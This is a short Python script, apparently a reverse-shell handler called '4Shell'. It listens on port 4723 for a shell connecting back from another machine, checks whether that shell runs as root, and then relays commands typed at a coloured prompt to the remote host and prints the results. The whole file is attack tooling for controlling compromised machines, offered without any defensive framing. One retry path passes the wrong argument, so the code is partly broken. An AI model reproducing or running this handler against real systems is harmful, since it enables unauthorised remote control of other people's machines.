import socket
import sys
import os
from colorama import Fore,Back

def Main():
        host = '0.0.0.0'
        port = 4723
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        try:
            s.bind((host,port))
            s.listen(5)
            resp(0,"Listening connection at %s:%s" % (host,port))
        except PermissionError:
            resp(1,"Permission Denied!")
            sys.exit()
        except OSError as e:
            if e.args[0] == 98:
                resp(1,"Address already in use!")
                sys.exit()
        conn, addr = s.accept()
        resp(0, "4Shell connected with: %s" % (str(addr[0])))
        try:
            conn.send("whoami".encode())
            user = conn.recv(1024).decode().strip()
            if user == "root":
                    print(f"[ {Fore.RED}ROOT{Fore.RESET} ] Shell is connected as root!")
                    euid = 0
            else:
                    print(f"[ {Fore.BLUE}USER{Fore.RESET} ] Shell is connect as user!")
                    euid = 1
            prompt(user,euid,addr[0],conn)
            while shell != 'exit':
                conn.sendall(shell.encode())
                data = conn.recv(4096).decode().strip()
                if data:
                    print(f'{Fore.RESET}{Fore.GREEN}{data}{Fore.RESET}')
                prompt(user,euid,addr[0],conn)
        except KeyboardInterrupt:
                resp(1,"Keyboard Interrupt!")
                sys.exit(0)
        s.close()
def resp(typo,message):
    if typo == 1:
        print(f"{Fore.RESET}[ {Fore.RED}ERROR{Fore.RESET} ] Exiting the shell. \n\t[\033[033m Err \033[00m: {message} ]")
    elif typo == 0:
        print(f"{Fore.RESET}[ {Fore.GREEN}OK{Fore.RESET} ] {message}")
def prompt(user,euid, host, conn):
    global shell
    conn.sendall("pwd".encode())
    pwd = conn.recv(1024).decode().strip()
    shell = input("\033[00m%s@%s~%s%s " % (Fore.RED+user+Fore.RESET,Fore.YELLOW+host+Fore.RESET, Fore.CYAN+pwd+Fore.RESET, "#" if euid==0 else "$"))
    while not shell:
        prompt(user,euid,host,pwd)
if __name__ == '__main__':
    Main()
